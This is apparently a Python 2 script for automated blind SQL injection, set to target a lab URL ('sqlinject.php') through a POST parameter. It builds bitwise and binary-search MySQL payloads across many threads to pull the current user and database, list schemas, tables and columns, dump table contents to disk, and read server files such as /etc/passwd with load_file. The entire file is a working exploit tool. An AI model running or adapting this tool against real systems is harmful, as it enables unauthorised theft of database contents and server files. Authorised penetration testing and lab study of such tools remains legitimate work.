#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org


import requests
import sys
import binascii
from requests.adapters import HTTPAdapter
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing.dummy import Lock
from time import time


url = "http://192.168.181.150/sqlinject.php"
success_flag = "liusai"
keys=list(r''' @ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{|}~!"#$%&'()*+,-./0123456789:;<=>?[\]^_`''')

bo = " and ord(substr((%query) from %index for 1))=%value"
b01 = " and ((ord(substr((%query) from %index for 1))&%value))>0"
blind_count = " and 1=(if(((%query)>%value),1,0))"
blind_coun2 = " and 1=(if(((%query)&%value>0),1,0))"
query = "(select %s from t_n limit %d,1)"
len_bounday = " and length(%query)=%value"
len_bounday2 = " and 1=(if((length(%query)>%value),1,0))"
len_bounday3 = " and ((length(%query))&%value)>0"
boundary = b01

query_tab="(select %s from t_n where table_schema={db} limit %d,1)"
query_col="(select %s from t_n where table_schema={db} and table_name={table} limit %d,1)"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
}
proxies = {'http':'127.0.0.1:8080'}
inject_point = {'id':'2'}
conf ={'url':url,'method':'post','proxies':{},'inject':inject_point,'thread_num':25,'debug':False}
conf['proxies'] = proxies
req = requests.session()
req.headers = headers
req.mount('http://', HTTPAdapter(max_retries=3))
req.mount('https://', HTTPAdapter(max_retries=3))
req.proxies = conf['proxies']


class DATA_AND(object):
    def __init__(self, payloads):
        self.threads = conf['thread_num']
        self.payloads = payloads
        self.mutex = Lock()

    def run(self, payload):
        try:
            data = payload['payload']
            text = send_data(data)
            if not find_success(success_flag, text):
                value = 0
                self.mutex.acquire()
                payload['value'] = value
                self.mutex.release()
        except Exception as e:
            print e.message

    def _start(self):
        try:

            pool = ThreadPool(processes=self.threads)
            pool.map_async(self.run, self.payloads).get(0xffff)
            pool.close()
            pool.join()

        except Exception as e:
            print e
        except KeyboardInterrupt:
            print '[!] user quit!'
            sys.exit(1)


def main():
    print('Help info.\nPlease provide your action:[get_current_user|get_current_db|get_dbs|get_tables|get_columns|read_file|dump|dump_all]')
    print('main')
    act = raw_input("Please raw_input your action:")
    action(act)


def put_file_contents(filename,contents):
    with open(filename,"a+") as fin:
        fin.write(contents+"\n")


def tamper(payload):
    return payload


def action(act):
    if act == 'get_current_user':
        user = get_current_user()
        print("current_user:"+user)
    if act == 'get_current_db':
        db = get_current_database()
        print("current_db:" + db)
    if act == 'get_dbs':
        dbs = get_dbs()
        print("all dbs is:", dbs)
    if act == 'get_tables':
        db = raw_input('please_db_name:')
        tables = get_tables(db)
        print("{0} tables".format(db),tables)
    if act == 'get_columns':
        db = raw_input('please_db_name:')
        table = raw_input('please_table_name:')
        cols = get_columns(db,table)
        print(cols)
    if act == 'dump':
        db = raw_input('please_db_name:')
        table = raw_input('please_table_name:')
        col = raw_input('please_column_name:')
        text = dump(db,table,col)
        print(text)
    if act == 'dump_all':
        db = raw_input('please_db_name:')
        dump_all(db)
    if act == 'read_file':
        filename = raw_input('please input filename:/etc/passwd:')
        text = read_file(filename)
        if text:
            put_file_contents('down_file_con.txt',text +"{0}\n".format('*'*10))
            print(text)
    return


def find_success(flag,text):
    text =str(text)
    ret = False
    if flag in text:
        ret = True
    return ret


def format_hex(str):
    return "0x"+binascii.b2a_hex(str)


def get_current_database():
    table_name = 'information_schema.schemata'
    col_name = ["database()"]
    database = get_values_by_and_blind(table_name,col_name,'0',query=query)
    return database


def get_current_user():
    table_name = 'information_schema.schemata'
    col_name = ["user()"]
    user= get_values_by_and_blind(table_name, col_name, '0', query=query)
    return user


def read_file(filename):
    file = 'load_file({0})'.format(format_hex(filename))
    table_name = 'information_schema.schemata'
    col_name = [file]
    text = get_values_by_and_blind(table_name,col_name,'0',query=query)
    return text


def get_dbs():
    dbs = []
    table_name = 'information_schema.schemata'
    col_name = ["schema_name"]
    cur_query = query
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    for i in range(int(counts)):
        db= get_values_by_and_blind(table_name, col_name, str(i),query=cur_query)
        dbs.append(db)
        print("Ent:" + db)
    return dbs


def get_tables(db):
    table_name = 'information_schema.tables'
    col_name = ["table_name"]
    cur_query = query_tab.replace("{db}", format_hex(db))
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    tables = []
    for i in range(int(counts)):
        table = get_values_by_and_blind(table_name, col_name, str(i),query=cur_query)
        tables.append(table)
        print("Ent:" + table)
    return tables


def get_columns(db,table):
    table_name = 'information_schema.columns'
    col_name = ["column_name"]
    cur_query= query_col.replace("{db}", format_hex(db)).replace("{table}", format_hex(table))
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    columns = []
    for i in range(int(counts)):
        col = get_values_by_and_blind(table_name, col_name, str(i),query =cur_query)
        columns.append(col)
        print("Ent:" + col)
    return columns


def dump(db, table, col):
    table_name = '{0}.{1}'.format(db, table)
    col_name = ["{0}".format(col)]
    cur_query = query
    counts = get_counts(table_name, col_name,query = cur_query)
    data = []
    for i in range(int(counts)):
        value = get_values_by_and_blind(table_name, col_name, str(i),query =cur_query)
        info = ("Ent:{0}.{1}:{2}".format(table_name, col_name, value))
        print(info)
        put_file_contents('dump_data.txt',info)
        data.append(value)
    return data


def dump_all(db):
    dbs = [db]
    tables = []
    cols = []
    for db in dbs:
        if not tables:
            tables = get_tables(db)
        print(tables)
        for table in tables:
                cols = get_columns(db,table)
                print(cols)
                for col in cols:
                    data = dump(db, table, col)
                    print(data)
                    data = '|'.join(data)
                    put_file_contents('dump_data.txt', data)
    return

'''
def get_counts(table_name,cols,i="0",query=query):
    global boundary
    cols= ["count(*)"]
    counts = ''
    orgin_boundary = boundary
    boundary = blind_coun2
    # counts = and_operation_search(table_name, cols, i, "",query =query)
    payloads = []
    for j in range(8):
        value = 2 ** j
        payload = get_payload(table_name, cols, i, '0', value=str(value), query=query)
        data = {}
        data['index'] = i
        data['value'] = value
        data['payload'] = payload
        payloads.append(data)
    dump = DATA_AND(payloads)  # params(threadnums,url_lists)
    dump._start()
    group_list = []
    indexs = list(set([i.get('index') for i in payloads]))
    for index in indexs:
        temp = []
        for payload in payloads:
            if payload.get('index') == index:
                temp.append(payload['value'])
        group_list.append(temp)
    _ = [sum(v) for v in group_list]
    counts = _[0]
    boundary = orgin_boundary
    print("CountsEnties:" + str(counts))
    return counts


def get_length(table_name,cols,i=0,query =query): # limit i
    global  boundary
    boundary = len_bounday3
    #len_index = and_operation_search(table_name, cols,i,"",query=query)

    payloads = []
    for j in range(8):
        value = 2 ** j
        payload = get_payload(table_name, cols, i, '0', value=str(value), query=query)
        data = {}
        data['index'] = i
        data['value'] = value
        data['payload'] = payload
        payloads.append(data)
    dump = DATA_AND(payloads)  # params(threadnums,url_lists)
    dump._start()
    group_list = []
    indexs  = list(set([i.get('index') for i in payloads]))
    for index in indexs:
        temp = []
        for payload in payloads:
            if payload.get('index') == index:
                temp.append(payload['value'])
        group_list.append(temp)
    _ = [sum(v) for v in group_list]
    len_index = _[0]
    boundary = b01 # double_query get value
    print('value len is:',len_index)
    return len_index

'''
def get_counts(table_name,cols,i="0",query=query):
    global boundary
    cols= ["count(*)"]
    counts = ''
    orgin_boundary = boundary
    boundary = blind_count
    counts =  double_search(table_name, cols, i, "", left_number=0, right_number=10,query =query)
    boundary = orgin_boundary
    print("CountsEnties:" + str(counts))
    return counts


def get_length(table_name,cols,i=0,query =query): # limit i
    global  boundary
    # boundary = len_query
    boundary = len_bounday2
    len_index = double_search(table_name, cols,i,"",left_number=0,right_number=10,query=query)
    '''
    while True:
        try:
            payload = get_payload(table_name,cols,i,"",str(len_index))
            global url
            con_url = url + ' ' + payload
            res = req.get(con_url)
            if success_flag in res.text:
                break
            len_index = len_index +1
        except Exception,e:
            print e.message
    # boundary = bo enmu get value
    '''
    boundary = b01 # double_query get value
    print('value len is:',len_index)
    return len_index


def double_search(table_name, col_name, in_limit='0', index="", query =query,left_number=0, right_number=0):
    while True:
        payload = get_payload(table_name, col_name, in_limit, index, value=str(right_number), query=query)
        text = send_data(payload)
        if find_success(success_flag, text):
            left_number = right_number
            right_number = 2*right_number
        else:
            break

    while left_number < right_number:
        mid = int((left_number + right_number) / 2)
        payload = get_payload(table_name,col_name,in_limit,index,value=str(mid),query =query)
        text =send_data(payload)
        if find_success(success_flag, text):
            left_number = mid
        else:
            right_number = mid
        if left_number == right_number - 1:
            payload = get_payload(table_name, col_name, in_limit, index, value=str(mid), query=query)
            text = send_data(payload)
            if find_success(success_flag, text):
                mid += 1
                print('found')
                break
            else:
                break
    return mid


def send_data(payload):
    ret = ''
    param = {}
    post_data = {}
    inject_key = list(conf['inject'].keys())[0]
    value = conf['inject'][inject_key]+payload
    param.update({inject_key:value})
    post_data.update({inject_key:value})
    method = conf['method']
    url = conf['url']
    if 'get' == method:
        response = req.get(url,params=param)
        if response.status_code == 200:
            ret = response.content
    if 'post' == method:
        response = req.post(url,params =param,data = post_data)
        if response.status_code == 200:
            ret = response.content
    if not ret:
        print("send data not success!")
        sys.exit(0)
    return ret



def get_payload(table_name,col_name,i="0",index="",value="",query =query): # (index,vaule) is used blind
    cols = []
    for col in col_name:
        cols.append(col)
    cat_str = cols[0]
    payload = query.replace('t_n',table_name)
    payload = payload.replace('%s', cat_str)
    payload = payload.replace('%d', i)
    payload = boundary.replace('%query', payload)
    payload = payload.replace('%index', index)
    payload = payload.replace('%value', value)
    payload = ' '+ payload
    if conf['debug']:
        print(payload)
    payload = tamper(payload)
    return payload


def get_values_by_and_blind(table_name, col_name, in_limit='0', query =query):
    cu_query = query
    len = int(get_length(table_name, col_name, in_limit,cu_query))
    text = ""
    if len > 0:
        payloads = []
        for  i in range(1,len+1):
            for j in range(8):
                value = 2 ** j
                payload = get_payload(table_name, col_name, in_limit, str(i), value=str(value), query=query)
                data = {}
                data['index'] = i
                data['value'] = value
                data['payload'] = payload
                payloads.append(data)
        dump = DATA_AND(payloads)  # params(threadnums,url_lists)
        dump._start()
        group_list = []
        indexs  = list(set([i.get('index') for i in payloads]))
        for index in indexs:
            temp = []
            for payload in payloads:
                if payload.get('index') == index:
                    temp.append(payload['value'])
            group_list.append(temp)
        _ = [sum(v) for v in group_list]
        text = ''.join([chr(v) for v in _])
        print("In program: " + text)
    return text


def and_operation_search(table_name, col_name, in_limit='0', index="", query =query):
    ret = ""
    value = 0
    for i in range(8):
        payload = get_payload(table_name, col_name, in_limit, index, value=str(2**i), query=query)
        text = send_data(payload)
        if find_success(success_flag, text):
            value = value+(2**i)
    ret = value
    return ret


if __name__ == '__main__':
    start_time = time()
    main()
    print('cost time:{0}'.format(time()-start_time))



